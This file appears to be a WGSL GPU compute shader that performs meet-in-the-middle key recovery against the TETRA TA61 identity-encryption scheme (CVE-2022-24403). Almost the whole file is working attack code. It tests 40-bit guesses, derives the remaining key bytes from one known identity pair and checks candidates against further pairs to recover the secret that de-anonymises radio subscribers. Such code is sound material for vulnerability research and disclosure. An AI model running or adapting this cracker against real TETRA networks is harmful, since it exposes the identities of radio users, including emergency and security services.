// TA61 identity-secret recovery on the GPU (CVE-2022-24403).
//
// One invocation tests one 40-bit meet-in-the-middle guess: the five bytes
// c0,c2,c3,c5,c6. From the first (SSI, ESI) pair the other three bytes
// c1,c4,c7 follow, since the middle round is invertible: encrypt the SSI to
// the midpoint, decrypt the ESI back to it, and their xor is (c1,c4,c7). The
// candidate c is then checked against the remaining pairs; a full 8-byte c
// consistent with all of them is recorded. WGSL has no u8, so bytes live in
// the low 8 bits of a u32.

const MAX_PAIRS: u32 = 8u;

struct Params {
    base_lo: u32,   // low 32 bits of the first guess of this dispatch
    base_hi: u32,   // high 8 bits (guess is 40-bit)
    count: u32,     // guesses in this dispatch
    n_pairs: u32,
    ssi: array<u32, MAX_PAIRS>,  // 24-bit each
    esi: array<u32, MAX_PAIRS>,
};

@group(0) @binding(0) var<storage, read> params: Params;
@group(0) @binding(1) var<storage, read> sbox: array<u32, 256>;
@group(0) @binding(2) var<storage, read> inv_sbox: array<u32, 256>;
// found flag, then c as two words: lo = c0..c3, hi = c4..c7.
@group(0) @binding(3) var<storage, read_write> found: atomic<u32>;
@group(0) @binding(4) var<storage, read_write> c_lo: atomic<u32>;
@group(0) @binding(5) var<storage, read_write> c_hi: atomic<u32>;

fn b0(w: u32) -> u32 { return (w >> 16u) & 0xffu; }
fn b1(w: u32) -> u32 { return (w >> 8u) & 0xffu; }
fn b2(w: u32) -> u32 { return w & 0xffu; }

// The `trid` permutation over three bytes.
fn trid(x: array<u32, 3>) -> array<u32, 3> {
    let a = x[0]; let b = x[1]; let c = x[2];
    let i0 = (((b + a) << 1u) - c) & 0xffu;
    let i1 = (((c + a) << 1u) - b) & 0xffu;
    let i2 = (((c + b) << 1u) - a) & 0xffu;
    return array<u32, 3>(sbox[i0], sbox[i1], sbox[i2]);
}

// The inverse permutation: inverse sbox, then the inverse linear mix. The
// mix has negative coefficients, so it is done in signed 32-bit then masked.
fn trid_inv(x: array<u32, 3>) -> array<u32, 3> {
    let xx = i32(inv_sbox[x[0]]);
    let yy = i32(inv_sbox[x[1]]);
    let zz = i32(inv_sbox[x[2]]);
    let o0 = u32(114 * xx + 114 * yy - 57 * zz) & 0xffu;
    let o1 = u32(114 * xx - 57 * yy + 114 * zz) & 0xffu;
    let o2 = u32(-57 * xx + 114 * yy + 114 * zz) & 0xffu;
    return array<u32, 3>(o0, o1, o2);
}

// Encrypt a 24-bit SSI to its ESI under c (8 bytes in two words).
fn encrypt_id(clo: u32, chi: u32, ssi: u32) -> u32 {
    let c0 = clo & 0xffu;
    let c1 = (clo >> 8u) & 0xffu;
    let c2 = (clo >> 16u) & 0xffu;
    let c3 = (clo >> 24u) & 0xffu;
    let c4 = chi & 0xffu;
    let c5 = (chi >> 8u) & 0xffu;
    let c6 = (chi >> 16u) & 0xffu;
    let c7 = (chi >> 24u) & 0xffu;
    var s = array<u32, 3>(b0(ssi) ^ c0, b1(ssi) ^ c3, b2(ssi) ^ c6);
    s = trid(s);
    s = array<u32, 3>(s[0] ^ c1, s[1] ^ c4, s[2] ^ c7);
    s = trid(s);
    return ((s[0] ^ c2) << 16u) | ((s[1] ^ c5) << 8u) | (s[2] ^ c0);
}

@compute @workgroup_size(64)
fn main(@builtin(global_invocation_id) gid: vec3<u32>) {
    let i = gid.x;
    if (i >= params.count) { return; }
    if (atomicLoad(&found) != 0u) { return; }

    // 40-bit guess = base + i.
    let lo = params.base_lo + i;
    let carry = select(0u, 1u, lo < params.base_lo);
    let hi = params.base_hi + carry;
    let c0 = lo & 0xffu;
    let c2 = (lo >> 8u) & 0xffu;
    let c3 = (lo >> 16u) & 0xffu;
    let c5 = (lo >> 24u) & 0xffu;
    let c6 = hi & 0xffu;

    // Forward to the midpoint from pair 0's SSI.
    let s0 = params.ssi[0];
    let p1 = trid(array<u32, 3>(b0(s0) ^ c0, b1(s0) ^ c3, b2(s0) ^ c6));
    // Backward to the same midpoint from pair 0's ESI.
    let e0 = params.esi[0];
    let e = array<u32, 3>(b0(e0) ^ c2, b1(e0) ^ c5, b2(e0) ^ c0);
    let p2 = trid_inv(e);
    let c1 = p1[0] ^ p2[0];
    let c4 = p1[1] ^ p2[1];
    let c7 = p1[2] ^ p2[2];

    let clo = c0 | (c1 << 8u) | (c2 << 16u) | (c3 << 24u);
    let chi = c4 | (c5 << 8u) | (c6 << 16u) | (c7 << 24u);

    // Verify against the remaining pairs.
    for (var k = 1u; k < params.n_pairs; k = k + 1u) {
        if (encrypt_id(clo, chi, params.ssi[k]) != params.esi[k]) {
            return;
        }
    }

    atomicStore(&c_lo, clo);
    atomicStore(&c_hi, chi);
    atomicStore(&found, 1u);
}
